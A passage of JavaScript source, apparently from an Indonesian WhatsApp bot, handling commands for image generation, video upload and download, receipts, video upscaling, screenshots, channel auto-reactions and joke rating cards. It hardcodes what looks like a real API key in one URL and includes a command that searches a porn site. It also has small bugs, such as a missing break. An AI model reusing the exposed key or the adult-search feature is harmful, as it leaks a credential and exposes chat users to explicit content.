 "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/",
 };
//const  require("axios");
 const response = await axios.get(url, { headers });
 if (response.data && response.data.image_link) {
 Putzz.sendMessage(m.chat, { image: { url: response.data.image_link }, caption: `Berikut gambar untuk: *${text}*` }, { quoted: m });
 } else {
 ReplyLanz("Gagal mendapatkan gambar.");
 }
 } catch (error) {
 ReplyLanz("Terjadi kesalahan saat mengambil gambar.");
 console.error(error);
 }
 }
 generateImage(text);
}
 break
 case 'videydl': {
  if (!text) return ReplyLanz(`Contoh:\n.videydl https://videy.co/v/xxxxx`)

  try {
    // ambil ID dari link videy
    let id = text.split('/v?id=')[1]
    if (!id) return ReplyLanz('❌ Link videy tidak valid')

    // direct video (videy biasanya pakai ini)
    let videoUrl = `https://cdn.videy.co/${id}.mp4`

    await Putzz.sendMessage(m.chat, {
      video: { url: videoUrl },
      caption: `🎬 Videy Downloader\n\n🔗 ${text}`
    }, { quoted: m })

  } catch (err) {
    console.log(err)
    ReplyLanz('⚠️ Gagal mengambil video')
  }
}
break
 case 'videy': {
  if (!args[0]) return ReplyLanz(`*Usage:*\n${prefix}videy up (reply video)\n${prefix}videy down <url>`);

  if (args[0].toLowerCase() === 'up') {
    if (!/video/.test(mime)) return ReplyLanz(`Kirim/Reply video dengan caption *${prefix + command} up*`);
    await Putzz.sendMessage(m.chat, { text: global.mess.wait }, { quoted: m });

    try {
      const buffer = await quoted.download();
      const ext = (quoted.mimetype || '').split('/')[1] || 'mp4';
      const form = new FormData();
      form.append('file', buffer, {
        filename: 'video.' + ext,
        contentType: 'video/' + ext
      });
  //    const  require('axios');
      const res = await axios.post('https://videy.co/api/upload', form, {
        headers: {
          Accept: 'application/json',
          'User-Agent': 'Mozilla/5.0',
          ...form.getHeaders()
        }
      });

      if (res.data && res.data.id) {
        let link = `https://videy.co/v?id=${res.data.id}`;
        await Putzz.sendMessage(m.chat, { text: link }, { quoted: m });
      } else {
        throw 'ID tidak ditemukan dalam respons';
      }
    } catch (err) {
      console.error(err);
      ReplyLanz('Gagal mengupload video ke Videy.');
    }

  } else if (args[0].toLowerCase() === 'down') {
    if (!args[1]) return ReplyLanz(`Contoh: ${prefix + command} down https://videy.co/v?id=xxxxx`);
    if (!/^https:\/\/videy\.co\/v\?id=/.test(args[1])) return ReplyLanz(global.mess.url);
    await Putzz.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });

    try {
      const id = new URL(args[1]).searchParams.get('id');
      const videoUrl = `https://cdn.videy.co/${id}.mp4`;
//      const  require('axios');
      const { data } = await axios.get(videoUrl, { responseType: 'arraybuffer' });
      await Putzz.sendMessage(m.chat, { video: data, mimetype: 'video/mp4' }, { quoted: m });
    } catch (err) {
      console.error(err);
      ReplyLanz('Gagal mendownload video dari Videy.');
    }
  } else {
    ReplyLanz(`*Usage:*\n${prefix}videy up (reply video)\n${prefix}videy down <url>`);
  }
}
break

case "struk": {
  if (!text) return ReplyLanz("Format salah!\nGunakan: .struk toko|nama_penjual|kontak_penjual|items|metode_pembayaran|info_tambahan\n\nContoh:\n.struk TOKO BIYU|Yubi|6285776461481|Es Teh-5000-2,Nasi Goreng-15000-1|Cash|Terima kasih sudah datang!")
  let [toko, namaPenjual, kontakPenjual, items, metodePembayaran, infoTambahan] = text.split("|")
  if (!toko || !namaPenjual || !kontakPenjual || !items || !metodePembayaran) return ReplyLanz("*Format tidak lengkap*")
  let daftarBarang = items.split(",").map((item, index) => {
    let [nama, harga, jumlah] = item.split("-")
    return {
      nomor: index + 1,
      nama,
      harga: parseInt(harga),
      jumlah: parseInt(jumlah),
      total: parseInt(harga) * parseInt(jumlah)
    }
  })
  const { createCanvas } = require('canvas')
//  const equire('fs')
//  const equire('path')
  const canvasWidth = 600
  const canvasHeight = 600 + daftarBarang.length * 30
  const canvas = createCanvas(canvasWidth, canvasHeight)
  const ctx = canvas.getContext('2d')
  ctx.fillStyle = "#fff"
  ctx.fillRect(0, 0, canvas.width, canvas.height)
  ctx.fillStyle = "#000"
  ctx.font = "bold 20px monospace"
  ctx.textAlign = "center"
  ctx.fillText(toko.toUpperCase(), canvasWidth / 2, 40)
  ctx.font = "14px monospace"
  ctx.fillText(`Kontak Penjual: ${kontakPenjual}`, canvasWidth / 2, 65)
  let transaksiNomor = Math.floor(Math.random() * 1000000000000000)
  let currentDate = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
  ctx.textAlign = "left"
  ctx.fillText(`Nomor Transaksi: ${transaksiNomor}`, 20, 100)
  ctx.fillText(`Tanggal: ${currentDate}`, 20, 125)
  ctx.beginPath()
  ctx.moveTo(20, 150)
  ctx.lineTo(canvasWidth - 20, 150)
  ctx.stroke()
  let startY = 175
  daftarBarang.forEach((item, i) => {
    ctx.fillText(`${item.nomor}. ${item.nama} - Rp${item.harga.toLocaleString()} x ${item.jumlah} = Rp${item.total.toLocaleString()}`, 20, startY + i * 30)
  })
  let lastItemY = startY + daftarBarang.length * 30 + 10
  ctx.beginPath()
  ctx.moveTo(20, lastItemY)
  ctx.lineTo(canvasWidth - 20, lastItemY)
  ctx.stroke()
  let subtotal = daftarBarang.reduce((sum, item) => sum + item.total, 0)
  let pajak = subtotal * 0.1
  let totalPembayaran = subtotal + pajak
  ctx.fillText(`Subtotal: Rp${subtotal.toLocaleString()}`, 20, lastItemY + 25)
  ctx.fillText(`Pajak (10%): Rp${pajak.toLocaleString()}`, 20, lastItemY + 50)
  ctx.fillText(`Total Pembayaran: Rp${totalPembayaran.toLocaleString()}`, 20, lastItemY + 75)
  ctx.fillText(`Metode Pembayaran: ${metodePembayaran}`, 20, lastItemY + 100)
  if (infoTambahan) {
    ctx.fillText(`Info Tambahan: ${infoTambahan}`, 20, lastItemY + 125)
  }
  ctx.font = "bold 14px monospace"
  ctx.textAlign = "center"
  ctx.fillText("TERIMA KASIH TELAH BERBELANJA", canvasWidth / 2, lastItemY + 160)
  ctx.fillText(namaPenjual.toUpperCase(), canvasWidth / 2, lastItemY + 180)
  const buffer = canvas.toBuffer("image/png")
  const filePath = path.join(__dirname, "./tmp/receipt.png")
  fs.writeFileSync(filePath, buffer)
  await Putzz.sendMessage(m.chat, {
    image: { url: filePath },
    caption: "Ini Struk nya 📍\n\nPesan: Amanah Selalu :v\n~ Biyu"
  }, { quoted: m })
  fs.unlinkSync(filePath)
}
break


case "hdvideo": 
case "hdvid": {
  const ffmpeg = require('fluent-ffmpeg');
  const ffmpegStatic = require('ffmpeg-static');
  const { writeFile, unlink, mkdir } = require('fs').promises;
  const { existsSync } = require('fs');
//  const equire('path');

  if (!ffmpegStatic) {
    return Putzz.sendMessage(m.chat, { text: "❌ FFMPEG tidak ditemukan! Pastikan sudah diinstal dengan benar." }, { quoted: m });
  }

  ffmpeg.setFfmpegPath(ffmpegStatic);

  let inputPath, outputPath;

  try {
    let q = m.quoted || m;
    let mime = q.mimetype || q.msg?.mimetype || q.mediaType || "";

    if (!mime) return Putzz.sendMessage(m.chat, { text: "❌ Mana videonya?" }, { quoted: m });
    if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
      return Putzz.sendMessage(m.chat, { text: `❌ Format ${mime} tidak didukung!` }, { quoted: m });
    }

    Putzz.sendMessage(m.chat, { text: "⏳ Sedang memproses video, mohon tunggu sekitar 2 - 4 menit..." }, { quoted: m });

    let videoBuffer = await q.download?.();
    if (!videoBuffer) return Putzz.sendMessage(m.chat, { text: "❌ Gagal mengunduh video!" }, { quoted: m });

    let tempDir = path.join(__dirname, 'tmp');
    if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });

    inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
    outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);

    await writeFile(inputPath, videoBuffer);

    await new Promise((resolve, reject) => {
      ffmpeg(inputPath)
        .outputOptions([
          '-vf', 'scale=iw*2:ih*2:flags=lanczos,eq=contrast=1.2:saturation=1.8,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
          '-r', '60',
          '-preset', 'slow',
          '-crf', '18',
          '-c:v', 'libx264',
          '-pix_fmt', 'yuv420p',
          '-c:a', 'aac',
          '-b:a', '128k'
        ])
        .on('end', resolve)
        .on('error', (err) => {
          console.error("Error HD Video:", err);
          reject(err);
        })
        .save(outputPath);
    });

    await Putzz.sendMessage(m.chat, { video: { url: outputPath }, caption: "✅ Video berhasil ditingkatkan kualitasnya!" }, { quoted: m });
  } catch (err) {
    console.error("Error HD Video:", err);
    Putzz.sendMessage(m.chat, { text: "❌ Gagal meningkatkan kualitas video." }, { quoted: m });
  } finally {
    setTimeout(() => {
      if (inputPath) unlink(inputPath).catch(() => {});
      if (outputPath) unlink(outputPath).catch(() => {});
    }, 5000);
  }
}
break;
case "hdvideo2":
case "hdvid2": {
    const ffmpeg = require('fluent-ffmpeg');
    const ffmpegStatic = require('ffmpeg-static');
    const { writeFile, unlink, mkdir } = require('fs').promises;
    const { existsSync } = require('fs');
//    const equire('path');
    if (!ffmpegStatic) {
        return Putzz.sendMessage(m.chat, { text: "❌ FFMPEG tidak ditemukan! Pastikan sudah diinstal dengan benar." }, { quoted: m });
    }
    ffmpeg.setFfmpegPath(ffmpegStatic);
    let inputPath, outputPath;
    try {
        let q = m.quoted || m;
        let mime = q.mimetype || q.msg?.mimetype || q.mediaType || "";
        if (!mime) return Putzz.sendMessage(m.chat, { text: "❌ Mana videonya?" }, { quoted: m });
        if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
            return Putzz.sendMessage(m.chat, { text: `❌ Format ${mime} tidak didukung!` }, { quoted: m });
        }
        Putzz.sendMessage(m.chat, { text: "⏳ Sedang memproses video, mohon tunggu sekitar 2 - 4 menit..." }, { quoted: m });
        let videoBuffer = await q.download?.();
        if (!videoBuffer) return Putzz.sendMessage(m.chat, { text: "❌ Gagal mengunduh video!" }, { quoted: m });
        let tempDir = path.join(__dirname, 'tmp');
        if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });
        inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
        outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);
        await writeFile(inputPath, videoBuffer);
        await new Promise((resolve, reject) => {
            ffmpeg(inputPath)
                .outputOptions([
                    '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
                    '-r', '60',
                    '-preset', 'faster',
                    '-crf', '25',
                    '-c:v', 'libx264',
                    '-pix_fmt', 'yuv420p',
                    '-c:a', 'aac',
                    '-b:a', '128k'
                ])
                .on('end', resolve)
                .on('error', reject)
                .save(outputPath);
        });
        await Putzz.sendMessage(m.chat, { 
            video: { url: outputPath },
            caption: "✅ Video berhasil ditingkatkan kualitasnya!"
        }, { quoted: m });
    } catch (err) {
        console.error("Error HD Video:", err);
        Putzz.sendMessage(m.chat, { text: "❌ Gagal meningkatkan kualitas video." }, { quoted: m });
    } finally {
        setTimeout(() => {
            if (inputPath) unlink(inputPath).catch(() => {});
            if (outputPath) unlink(outputPath).catch(() => {});
        }, 5000);
    }
}
break


case 'createquote': 
case 'quoteimg': {
  if (!text) return ReplyLanz('Kirim teks quotesnya!\nContoh: .quoteimg Jangan pernah menyerah, bro.');
  const { createCanvas, loadImage } = require('canvas');
  function wrapText(ctx, text, maxWidth) {
    const words = text.split(' ');
    let lines = [];
    let currentLine = words[0];
    for (let i = 1; i < words.length; i++) {
      const word = words[i];
      const width = ctx.measureText(currentLine + ' ' + word).width;
      if (width < maxWidth) {
        currentLine += ' ' + word;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    lines.push(currentLine);
    return lines;
  }
  async function generateQuoteImage(ppUrl, username, quoteText) {
    const width = 1000;
    const height = 500;
    const canvas = createCanvas(width, height);
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#000000';
    ctx.fillRect(0, 0, width, height);
    const avatar = await loadImage(ppUrl);
    ctx.save();
    ctx.beginPath();
    ctx.arc(180, 250, 120, 0, Math.PI * 2, true);
    ctx.closePath();
    ctx.clip();
    ctx.drawImage(avatar, 60, 130, 240, 240);
    ctx.restore();
    ctx.fillStyle = '#ffffff';
    ctx.font = '28px sans-serif';
    let lines = wrapText(ctx, quoteText, 600);
    lines.forEach((line, i) => {
      ctx.fillText(line, 350, 180 + i * 35);
    });
    ctx.fillStyle = '#aaaaaa';
    ctx.font = '22px italic';
    ctx.fillText(`- ${username}`, 350, 180 + lines.length * 35 + 10);
    return canvas.toBuffer();
  }
  let pushname = m.pushName || m.sender.split('@')[0];
  let ppUrl = await Putzz.profilePictureUrl(m.sender, 'image').catch(() => 'https://img1.pixhost.to/images/5375/593382185_biyuofficial.jpg');
  let buffer = await generateQuoteImage(ppUrl, pushname, text);

  await Putzz.sendMessage(m.chat, {
    image: buffer,
    caption: `📝 Quote dari *${m.pushName}*\n\n> Biyu`,
    contextInfo: { mentionedJid: [m.sender] }
  }, { quoted: m });
}
break
case 'ssweb2': {
  if (!q.includes('|')) return ReplyLanz('Example:\nssweb2 url|thema|device\n\nContoh:\nssweb2 https://detik.com|dark|mobile\n\nList Thema: dark, light\nList Device: mobile, desktop, tablet')
  let [link, theme, device] = q.split('|')
  if (!/^https?:\/\//.test(link)) return ReplyLanz('Link harus diawali http:// atau https://')
  if (!['dark', 'light'].includes(theme)) return ReplyLanz('Theme hanya bisa: dark, light')
  if (!['mobile', 'desktop', 'tablet'].includes(device)) return ReplyLanz('Device hanya bisa: mobile, desktop, tablet')
  let apiUrl = `https://api.siputzx.my.id/api/tools/ssweb?url=${encodeURIComponent(link)}&theme=${theme}&device=${device}`
  
  try {
    await Putzz.sendMessage(m.chat, {
      image: { url: apiUrl },
      caption: `✅ Screenshot dari:\n${link}\n\nTheme: ${theme}\nDevice: ${device}`
    }, { quoted: m })
  } catch (e) {
    ReplyLanz('Gagal mengambil screenshot. Pastikan URL valid dan server API aktif.')
  }
}
  break
    
case "ssweb": {
if (!text) return ReplyLanz(example("https://example.com"))
if (!isUrl(text)) return ReplyLanz(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
//const equire('fs')
var data2 = await screenshotV2(text)
await Putzz.sendMessage(m.chat, { image: data2, mimetype: "image/png"}, {quoted: m})
}
case "kisahnabi": {
if (!text) return ReplyLanz(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return ReplyLanz("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*—————— \`[ K I S A H ]\` ——————*

${kisah.description}`

ReplyLanz(`${hasil}`)

}
break
case 'balogo':
case 'balg': {
  if (!args[1]) return ReplyLanz(`Contoh penggunaan:\n${prefix + command} Udin Offc\n\nGunakan 2 kata: text kiri dan text kanan.`)

  let [textL, textR] = args;
  let apiUrl = `https://api.nekorinn.my.id/maker/ba-logo?textL=${encodeURIComponent(textL)}&textR=${encodeURIComponent(textR)}`;

  try {
//const  require('axios');
    let res = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    let buffer = Buffer.from(res.data, 'binary');

    await Putzz.sendMessage(m.chat, {
      image: buffer,
      caption: `Berhasil membuat logo dengan teks:\nKiri: ${textL}\nKanan: ${textR}`
    }, { quoted: m });
  } catch (e) {
    console.log(e);
    ReplyLanz('Gagal mengambil data dari API. Coba lagi nanti.');
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "autoreactch":
case "autoreact": {

if (!isOwner) return ReplyLanz(mess.owner)

if (!text)
   return ReplyLanz(
`Contoh:
.autoreactch https://whatsapp.com/channel/xxx ❤️
.autoreactch off https://whatsapp.com/channel/xxx
.autoreactch offall`
   )

// ===== OFF ALL =====
if (text.toLowerCase() === "offall") {

   global.autoreactDB = {}
   saveAutoreact(global.autoreactDB)

   if (autoreactInterval) {
      clearInterval(autoreactInterval)
      autoreactInterval = null
   }

   return ReplyLanz("❌ Semua auto react dimatikan")
}

// ===== OFF SATU =====
if (text.toLowerCase().startsWith("off ")) {

   const link = text.split(" ")[1]

   const parts = link.split("/")
   const channelId = parts[4]

   if (!global.autoreactDB[channelId])
      return ReplyLanz("Channel tidak ditemukan")

   delete global.autoreactDB[channelId]
   saveAutoreact(global.autoreactDB)

   return ReplyLanz("❌ Auto react dimatikan")
}

// ===== SET AUTO REACT =====
const biyun = text.trim().split(" ")
const link = biyun[0]

if (!link.includes("https://whatsapp.com/channel/"))
   return ReplyLanz("Link channel tidak valid")

const parts = link.split("/")
const channelId = parts[4]

if (!channelId)
   return ReplyLanz("Channel ID tidak valid")

const emoji = biyun.slice(1).join(" ").trim()

if (!emoji)
   return ReplyLanz("Masukkan emoji")

global.autoreactDB[channelId] = {
   lastId: 0,
   emoji
}

saveAutoreact(global.autoreactDB)

ReplyLanz(`✅ Auto react aktif untuk channel ${channelId}`)

startAutoreactLoop(Putzz)

}
break

case "autoreavctch": {
  if (!isOwner) return ReplyLanz("❌ Owner only!");

  let cmd = text.trim().toLowerCase();

  if (cmd === "on") {
    global.autochannel.enabled = true;
    ReplyLanz("✅ Auto React Channel *ON*");
  } 
  else if (cmd === "off") {
    global.autochannel.enabled = false;
    ReplyLanz("❌ Auto React Channel *OFF*");
  } 
  else {
    ReplyLanz(`Gunakan command:
${prefix}autoreactch on
${prefix}autoreactch off`);
  }
  
  break;
}

            case 'idch':
            case 'cekidch': {
                if (!text) return ReplyLanz(example("linkchnya mana"))
                if (!text.includes("https://whatsapp.com/channel/")) return ReplyLanz("Link tautan tidak valid")
                let result = text.split('https://whatsapp.com/channel/')[1]
                let res = await Putzz.newsletterMetadata("invite", result)
                let teks = `> *ID : ${res.id}*
 *Nama :* ${res.name}
 *Total Pengikut :* ${res.subscribers}
 *Status :* ${res.state}
 *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            "messageContextInfo": {
                                "deviceListMetadata": {},
                                "deviceListMetadataVersion": 2
                            },
                            interactiveMessage: {
                                body: {
                                    text: teks
                                },
                                footer: {
                                    text: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴘᴜᴛᴢᴢ"
                                }, //input watermark footer
                                nativeFlowMessage: {
                                    buttons: [{
                                        "name": "cta_copy",
                                        "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
                                    }, ],
                                },
                            },
                        },
                    },
                }, {
                    quoted: m
                });
                await Putzz.relayMessage(msg.key.remoteJid, msg.message, {
                    messageId: msg.key.id
                });
            }
            break
case "searchxnxx": 
case "sxnxx":{
    if (!q) return ReplyLanz(`Example: ${prefix + command} anime`);
    ReplyLanz(mess.wait);
//const  require('axios');    
    try {
        const apiUrl = `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(q)}`;
        const { data } = await axios.get(apiUrl);
        
        if (!data.status) return ReplyLanz("Failed to fetch search results");
        
        let resultText = `*XNXX SEARCH RESULTS*\n`;
        resultText += `*Query:* ${q}\n`;
        resultText += `*Found:* ${data.result.length} videos\n\n`;
        
        const maxResults = 10;
        const displayResults = data.result.slice(0, maxResults);
        
        displayResults.forEach((video, index) => {
            resultText += `*${index + 1}. ${video.title}*\n`;
            resultText += `Info: ${video.info.trim()}\n`;
            resultText += `Link: ${video.link}\n\n`;
        });
        
        if (data.result.length > maxResults) {
            resultText += `_And ${data.result.length - maxResults} more results..._\n`;
            resultText += `_Use ${prefix}xnxxdown [link] to download any video_`;
        }
        
        await Putzz.sendMessage(m.chat, {
            text: resultText
        }, { quoted: m });
        
    } catch (error) {
        console.error(error);
        ReplyLanz(`Error: ${error.message}`);
    }
    }
    break
    case 'ttp3': case 'attp':
  if (args.length == 0) return ReplyLanz(`Example: ${prefix + command} Lanz`);
  ini_txt = args.join(" ");
  ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/attp?apikey=a8e86232771f9bc1826742c1&text=${ini_txt}`);
  await Putzz.sendAsSticker(m.chat, ini_buffer, m, {
    packname: global.packname,
    author: global.author,
  });
break

case 'ceksigma':
case 'sigmacek': {
  const teks = text ? text.trim() : ''
  let targetJid
  let targetName
  if (m.mentionedJid && m.mentionedJid.length > 0) {
    targetJid = m.mentionedJid[0]
    targetName = await Putzz.getName(targetJid)
  } else if (/^\d{5,}$/.test(teks)) {
    targetJid = teks.includes('@s.whatsapp.net') ? teks : teks + '@s.whatsapp.net'
    targetName = await Putzz.getName(targetJid).catch(() => teks)
  } else if (teks) {
    targetJid = m.sender
    targetName = teks
  } else {
    targetJid = m.sender
    targetName = await Putzz.getName(m.sender)
  }
  const score = Math.floor(Math.random() * 100) + 1
  let komentar, emoji
  if (command == 'ceksigma') {
    if (score >= 90) {
      komentar = 'Waduhh Sigma Abiezz cuyy🤫!'
      emoji = '🔥👑💯'
    } else if (score >= 75) {
      komentar = 'Sigma bet Anjayy'
      emoji = '✨🧸💘'
    } else if (score >= 60) {
      komentar = 'Lumayan lah sigma nya nyaingin saya.'
      emoji = '😎👍'
    } else if (score >= 40) {
      komentar = 'Sigma nya nyaingin bocil kematian.'
      emoji = '🤔🧼📸'
    } else if (score >= 20) {
      komentar = 'Sigma kayak sinyal 1 bar di hutan.'
      emoji = '📵🌲😂'
    } else {
      komentar = 'Waduh... Sigmanya disembunyiin kali ya?'
      emoji = '🥲💀👻'
    }
    const result = `*Cek Sigma Untuk:* ${targetName}\n\n` +
                   `*Nilai Sigma:* *${score}/100* ${emoji}\n\n` +
                   `*Komentar:* ${komentar}`
    Putzz.sendMessage(m.chat, {
      text: result,
      mentions: [targetJid],
    }, { quoted: m })
    }if (command == 'sigmacek') {
    if (score >= 90) {
      komentar = 'Waduhh Sigma Abiezz cuyy🤫!'
      emoji = '🔥👑💯'
    } else if (score >= 75) {
      komentar2 = 'Sigma bet Anjayy'
      emoji = '✨🧸💘'
    } else if (score >= 60) {
      komentar = 'Lumayan lah sigma nya nyaingin saya.'
      emoji = '😎👍'
    } else if (score >= 40) {
      komentar = 'Sigma nya nyaingin bocil kematian.'
      emoji = '🤔🧼📸'
    } else if (score >= 20) {
      komentar = 'Sigma kayak sinyal 1 bar di hutan.'
      emoji = '📵🌲😂'
    } else {
      komentar = 'Waduh... Sigmanya disembunyiin kali ya?'
      emoji = '🥲💀👻'
    }
    const result = `*Cek Sigma Untuk:* ${targetName}\n\n` +
                   `*Nilai Sigma:* *${score}/100* ${emoji}\n\n` +
                   `*Komentar:* ${komentar}`
       Putzz.sendMessage(m.chat, {
      text: result,
      mentions: [targetJid],
    }, { quoted: qfake })
  }
}
break

case 'cekganteng':
case 'cekcantik': {

const teks = text ? text.trim() : ''
let targetJid
let targetName

if (m.mentionedJid && m.mentionedJid.length > 0) {
targetJid = m.mentionedJid[0]
targetName = await Putzz.getName(targetJid)
} else if (/^\d{5,}$/.test(teks)) {
targetJid = teks.includes('@s.whatsapp.net') ? teks : teks + '@s.whatsapp.net'
targetName = await Putzz.getName(targetJid).catch(() => teks)
} else if (teks) {
targetJid = m.sender
targetName = teks
} else {
targetJid = m.sender
targetName = await Putzz.getName(m.sender)
}

const score = Math.floor(Math.random() * 100) + 1
let komentar, emoji

if (command == 'cekganteng') {

if (score >= 90) {
komentar = 'Gantengnya overload! Bikin cewek-cewek auto salfok!'
emoji = '🔥👑💯'
} else if (score >= 75) {
komentar = 'Fix calon idol K-Pop, visualnya ngalahin artis!'
emoji = '✨🧸💘'
} else if (score >= 60) {
komentar = 'Lumayanlah, bisa jadi cover boy majalah sekolah.'
emoji = '😎👍'
} else if (score >= 40) {
komentar = 'Masih bisa ganteng... asal pake lighting dan filter 10 lapis.'
emoji = '🤔🧼📸'
} else if (score >= 20) {
komentar = 'Gantengnya kayak sinyal 1 bar di hutan.'
emoji = '📵🌲😂'
} else {
komentar = 'Waduh... Gantengnya disembunyiin kali ya?'
emoji = '🥲💀👻'
}

} else {

if (score >= 90) {
komentar = 'Kecantikannya bikin bunga iri dan rembulan minder.'
emoji = '🌷✨🌙'
} else if (score >= 75) {
komentar = 'Manisnya kayak senja di tepi pantai, adem banget dipandang.'
emoji = '🌅🍬🌸'
} else if (score >= 60) {
komentar = 'Pesonanya sederhana tapi ngena, kayak kopi di pagi hari.'
emoji = '☕🌼😊'
} else if (score >= 40) {
komentar = 'Cantik sih... tapi kayak koneksi WiFi, kadang ada kadang hilang.'
emoji = '📶🤏😂'
} else if (score >= 20) {
komentar = 'Mungkin cantiknya perlu di-update ke versi terbaru.'
emoji = '🔄🤖🫣'
} else {
komentar = 'Kecantikannya kayak teka-teki, masih misteri.'
emoji = '🕵️‍♀️❓🌑'
}

}

let pp
try {
pp = await Putzz.profilePictureUrl(targetJid, 'image')
} catch {
pp = 'https://i.ibb.co/3Fh9V6p/avatar.png'
}

const avatar = await loadImage(pp)

/* BACKGROUND MIKASA HD */
const bg = await loadImage('https://files.catbox.moe/k67ivs.jpg')

const canvas = createCanvas(900,500)
const ctx = canvas.getContext('2d')

ctx.drawImage(bg,0,0,900,500)

/* overlay */

ctx.fillStyle = "rgba(0,0,0,0.55)"
ctx.fillRect(0,0,900,500)

/* avatar bulat */

ctx.save()
ctx.beginPath()
ctx.arc(150,250,90,0,Math.PI*2)
ctx.closePath()
ctx.clip()
ctx.drawImage(avatar,60,160,180,180)
ctx.restore()

/* title */

ctx.fillStyle = "#ffffff"
ctx.font = "bold 40px Sans"
ctx.fillText(
command == 'cekganteng' ? "CEK GANTENG" : "CEK CANTIK",
260,
80
)


ctx.font = "28px Sans"
ctx.fillText(`Nama : ${targetName}`,260,200)


ctx.fillStyle = "#00ff9d"
ctx.font = "bold 70px Sans"
ctx.fillText(`${score}/100`,260,290)


ctx.fillStyle = "#ffffff"
ctx.font = "24px Sans"

const textResult = `${emoji} ${komentar}`

wrapText(ctx,textResult,260,340,580,30)


function wrapText(ctx,text,x,y,maxWidth,lineHeight){
const words = text.split(' ')
let line = ''

for(let n=0;n<words.length;n++){
const testLine = line + words[n] + ' '
const metrics = ctx.measureText(testLine)
const testWidth = metrics.width

if(testWidth > maxWidth && n > 0){
ctx.fillText(line,x,y)
line = words[n] + ' '
y += lineHeight
}else{
line = testLine
}
}
ctx.fillText(line,x,y)
}

let buffer = canvas.toBuffer()

await Putzz.sendMessage(m.chat,{
image: buffer,
caption: `Hasil cek untuk ${targetName}`,
mentions:[targetJid]
},{quoted:m})

}
break

case 'creatorcard': {
  if (!text) return ReplyLanz(`Contoh:\n${prefix + command} LanzOfficial|creator|multi device|https://t.me/Putzzslebew`);

  let data = text.split("|");
  if (data.length < 4) return ReplyLanz("Format salah!\nContoh: nama|title|script|telegram");

  let [name, title, script, telegram] = data;

  try {
    const canvas = createCanvas(1024, 1536);
    const ctx = canvas.getContext('2d');

    // LINK BACKGROUND ASLI KAMU
    const bg = await loadImage('https://files.catbox.moe/3963k0.jpg').catch(err => {
      throw new Error("Gagal muat background: " + err.message);
    });
    ctx.drawImage(bg, 0, 0, canvas.width, canvas.height);

    // --- HEADER DI DALAM KOTAK, POSISI SESUAI GAMBAR ASLI ---
    ctx.fillStyle = "#C5C5C5";
    ctx.font = "30px sans-serif";
    ctx.textAlign = "left";
    ctx.fillText(`${name}.json`, 280, 580); // DI DALAM HEADER KOTAK

    // --- AREA JSON DI DALAM LAYAR, TIDAK KELUAR ---
    ctx.save();
    ctx.translate(510, 720);
    ctx.rotate(0);

    ctx.font = "27px monospace";
    ctx.textAlign = "left";

    const json = [
      '{',
      `  "name": "${name}",`,
      `  "title": "${title}",`,
      `  "script": "${script}",`,
      `  "telegram": "${telegram}"`,
      '}'
    ];

    let y = 0;
    for (let line of json) {
      ctx.fillStyle = line.includes('"name"') || line.includes('"title"') || line.includes('"script"') || line.includes('"telegram"') 
        ? "#4EC9B0" 
        : "#FFFFFF";
      
      ctx.fillText(line, -220, y); // DI DALAM LAYAR, TIDAK KELUAR
      y += 45;
    }

    ctx.restore();

    const buffer = canvas.toBuffer("image/png");

    await Putzz.sendMessage(m.chat, {
      image: buffer,
      caption: "Creator Info"
    }, { quoted: m });

  } catch (err) {
    return ReplyLanz("Error: " + err.message);
  }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'pfccin':
    case 'hgff': {

      if (!text) return ReplyLanz(`Format salah, contoh: \n${ command} Anime`)
      if (budy.match(`tobrut|susu|seksi|sexy`)) return ReplyLanz('GABOLEH YA, INGAT AKHIRAT INGAT TUHAN!');
      await Putzz.sendMessage(m.chat, {
        react: {
          text: '⏳',
          key: m.key
        }
      })

      let anutrest = await pinterest(text) // Ambil hasil pencarian
      if (!anutrest || anutrest.length === 0) return ReplyLanz("Error, Foto Tidak Ditemukan")

      // Ambil maksimal 10 gambar biar nggak terlalu panjang
      let selectedImages = anutrest.slice(0, 10);
      let anu = []

      for (let i = 0; i < selectedImages.length; i++) {
        let imgsc = await prepareWAMessageMedia({
          image: {
            url: selectedImages[i].image
          }
        }, {
          upload: Putzz.waUploadToServer
        })

        anu.push({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Gambar ke *${i + 1}*`,
            hasMediaAttachment: true,
            ...imgsc
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [{
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "Lihat di Pinterest",
